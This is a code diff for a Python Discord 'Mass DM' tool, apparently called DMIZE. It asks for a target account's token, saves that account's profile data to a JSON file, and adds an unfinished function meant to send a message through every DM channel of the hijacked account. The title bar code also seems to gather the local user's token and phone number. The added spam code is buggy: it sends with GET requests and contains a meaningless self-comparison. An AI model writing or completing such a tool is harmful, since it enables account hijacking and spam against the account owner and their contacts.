@@ -1,8 +1,10 @@
 import os, re, json, requests,datetime, colorama, base64, subprocess, importlib
 from json import loads, dumps
 from colorama import *
-
+from urllib.request import Request, urlopen
 from json import loads, dumps
+
+
 modules = [
     'urllib.request',
     'Crypto.Cipher',
@@ -188,7 +190,15 @@ def input_prompt():
 def print_prompt():
     return f'{Fore.GREEN}[{Fore.GREEN}{Fore.WHITE}!{Fore.WHITE}{Fore.GREEN}]{Fore.GREEN}'
 
+def is_path_exist(token):
+    for path in os.listdir(absolute_path()):
+        if path == f'{gather_discord_username(token=token)}.json': os.remove(path)
+
+def absolute_path():
+    return os.path.dirname(os.path.abspath(__file__))
+
 def write_info(token):
+    is_path_exist(token=token)
     user_info = requests.get('https://discord.com/api/v6/users/@me', headers=getheaders(token)).json()
     with open(f'{gather_discord_username(token=token)}.json', 'w') as file:
         json.dump(user_info, file, indent=4)
@@ -203,13 +213,39 @@ def check_token(token):
         exit()
 
 def Mass_Dm():
+    
+    #still in dev
+    def spam_mp(content):
+        try:
+            channel = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token))
+
+
+            for element in channel.json():
+                id_channel = element['id']
+                try:
+                    requests.get(f'https://discord.com/api/v9/channels/{id_channel}/messages',
+                    data={"content": f"{content}"},
+                    headers={'Authorization': token})
+                    
+                    if 'message' == 'Unknown Channel':
+                        print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE}{Fore.RED} An error occured while sending mp {Fore.RED}')
+                    
+                    else:
+                         print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Scraping dm : {id_channel}')
+                except:
+                        print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE}{Fore.RED} An error occured while sending mp {Fore.RED}')
+        except:
+            print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE}{Fore.RED} An error occured while sending mp {Fore.RED}')
+            print(channel)
+
+    
     token = input(f'{Fore.LIGHTBLACK_EX}{used()} {input_prompt()}{Fore.WHITE} Enter Token to MassDm :')
     check_token(token=token)
     print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Sucessfully log into {gather_discord_username(token=token)}')
     write_info(token=token)
     print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Target account info upload to {Fore.RED}{gather_discord_username(token=token)}.json{Fore.RED}')
-    content = input(f'{Fore.LIGHTBLACK_EX}{used()} {input_prompt()}{Fore.WHITE} Enter the message to sent trough {Fore.RED}{gather_discord_username(token=token)}{Fore.RED} account :')
-    
+    content = input(f'{Fore.LIGHTBLACK_EX}{used()} {input_prompt()}{Fore.WHITE} Enter the message to sent trough {Fore.RED}{gather_discord_username(token=token)}{Fore.RED}{Fore.WHITE} account :')
+   
 def main():
     set_console_title(f'DMIZE - Mass DM | connect as {gather_discord_username(token=gather_token())} : {gather_discord_phone(token=gather_token())}')
     gather_modules()
@@ -221,4 +257,4 @@ def main():
     input()
 
 if __name__ == "__main__":
-    main()
+    Mass_Dm()
